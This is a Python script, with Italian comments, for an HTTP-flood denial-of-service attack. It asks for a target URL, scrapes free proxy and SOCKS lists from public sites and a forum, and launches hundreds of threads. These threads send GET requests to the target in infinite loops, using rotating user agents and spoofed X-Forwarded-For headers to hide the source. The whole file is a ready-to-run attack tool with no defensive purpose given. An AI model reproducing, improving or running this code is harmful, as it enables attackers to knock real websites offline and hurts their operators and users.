import socket, threading, socks, random, re, urllib.request, os.path
from bs4 import BeautifulSoup

useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",]


def checkurl(): # in questa funzione setto l'url per renderlo usabile durante il settaggio della richieste HTTP.
	global url
	global url2
	global urlport
	url = input("Insert URL: ")

	if url == "":
		print ("Please enter the url.")
		checkurl()

	if url[0]+url[1]+url[2]+url[3] == "www.":
		url = "http://" + url
	elif url[0]+url[1]+url[2]+url[3] == "http":
		pass
	else:
		url = "http://" + url

	try:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
	except:
		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

	try:
		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
	except:
		urlport = "80"
	proxymode()

def proxymode():
	global choise1
	choise1 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choise1 == "y":
		choiseproxysocks()
	else:
		numthreads()

def choiseproxysocks():
	global choise2
	choise2 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choise2 == "0":
		choisedownproxy()
	elif choise2 == "1":
		choisedownsocks()
	else:
		print ("You mistyped, try again.")
		choiseproxysocks()

def choisedownproxy():
	choise3 = input("Do you want to download a fresh list of proxy? Answer 'y' to do it: ")
	if choise3 == "y":
		choisemirror1()
	else:
		proxylist()

def choisedownsocks():
	choise3 = input("Do you want to download a fresh list of socks? Answer 'y' to do it: ")
	if choise3 == "y":
		choisemirror2()
	else:
		proxylist()

def choisemirror1():
	global urlproxy
	choise5 = input ("Download from: free-proxy-list.net='0' or inforge.net='1' ")
	if choise5 == "0":
		urlproxy = "http://free-proxy-list.net/"
		proxyget1()
	elif choise5 == "1":
		proxyget2()
	else:
		print("You mistyped, try again.")
		choisemirror1()

def choisemirror2():
	global urlproxy
	choise5 = input ("Download from: socks-proxy.net='0' or inforge.net='1' ")
	if choise5 == "0":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget1()
	elif choise5 == "1":
		proxyget2()
	else:
		print("You mistyped, try again.")
		choisemirror2()

def proxyget1(): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito è identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except:
		print ("ERROR!")
	proxylist()

def proxyget2(): # anche questa funzione scarica proxy però da inforge.net
	try:
		if os.path.isfile("proxy.txt"):
			out_file = open("proxy.txt","w")
			out_file.write("")
			out_file.close()
		else:
			pass
		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
		soup = BeautifulSoup(urllib.request.urlopen(url)) # per strasformare in "zuppa" la source del sito
		base = "https://www.inforge.net/xi/"                       # questi comandi servono per trovare i link nella sezione
		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): # liste-proxy del forum
			links = tag.get("href")                                #
			final = base + links                                   #
			result = urllib.request.urlopen(final)                 # finalmente apre i link trovati
			for line in result :
				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) # cerca gli ip:porta dei proxy
				if ip:
					print("Grabbed=> "+"\n".join(ip))
					for x in ip:
						out_file = open("proxy.txt","a")
						while True:
							out_file.write(x+"\n")
							out_file.close()
							break
	except:
		print ("ERROR!")
	proxylist()

def proxylist():
	global entries
	out_file = str(input("Enter the proxy list (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	entries = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		try:
			threads = int(input("Insert number of threads (800): "))
		except:
			threads = 800
	except:
		print ("Try to use less threads.")
	begin()

def begin():
	choise4 = input("Press 'Enter' to start attack: ")
	if choise4 == "":
		loop()
	elif choise4 == "Enter": #lool
		loop()
	elif choise4 == "enter": #loool
		loop()
	else:
		exit(0)

def loop():
	global threads
	for x in range(threads): # con questa forumula diciamo ai threads di attaccare.
		attack().start() # start() non fa altro che leggere nella classe threading.Thread cercando la funzione run(self), la quale
                         # serve per dare istruzioni ai threads.

class attack(threading.Thread): # la classe del multithreading

	def run(self): # la funzione che dà le istruzioni ai vari threads
		self.setuprequest() # intanto costruiamo l' anteprima della richiesta (anteprima perchè la final request sarà dopo)
		if choise1 == "y":
			if choise2 == "0":
				self.requestproxy() # se abbiamo scelto la modalità proxy, esegue attacco con proxy
			elif choise2 == "1":
				self.requestsocks() # se abbiamo scelto la modalità socks, esegue attacco con socks
			else:
				exit(0)
		else:
			self.requestdefault() # altrimenti manda richieste normali non proxate.

	def setuprequest(self): # composizione anteprima richiesta
		global get_host
		global useragent
		global accept
		global connection
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
		connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol

	def requestproxy(self): # funzione dedicata all'invio di richiesto tramite proxy
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
		request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
		proxy = random.choice(entries).strip().split(":") # selezione proxy casuale
		while True: # ciclo infinito
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ecco il nostro socket
				s.connect((str(proxy[0]), int(proxy[1]))) # connessione al proxy
				s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				print ("Request sent from " + str(proxy[0]+":"+proxy[1])) # print delle richieste
			except:
				s.close() # se qualcosa va storto, chiude il socket e il ciclo ricomincia

	def requestsocks(self): # funzione per invio richieste tramite socks
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		proxy = random.choice(entries).strip().split(":") # selezione di proxy causale
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
				s = socks.socksocket() # creazione socket con pysocks
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
			except: # questo except collegga al try sotto.
				try: # il try prova a vedere se l'errore è causato dalla tipologia di socks errata, infatti prova con SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
					s = socks.socksocket()
					s.connect((str(url2), int(urlport)))
					s.send (str.encode(request))
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]))
				except:
					print ("Socks down. Retrying request.")
					s.close() # se nemmeno con quel try si è riuscito a inviare niente, allora il sock è down e chiude il socket.

	def requestdefault(self): # funzione per l'invio di richieste non proxate
		request = get_host + useragent + accept + connection + "\r\n" # composizione final request
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(url2), int(urlport)))
				s.send (str.encode(request))
				print ("Request sent!")
			except:
				pass

checkurl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
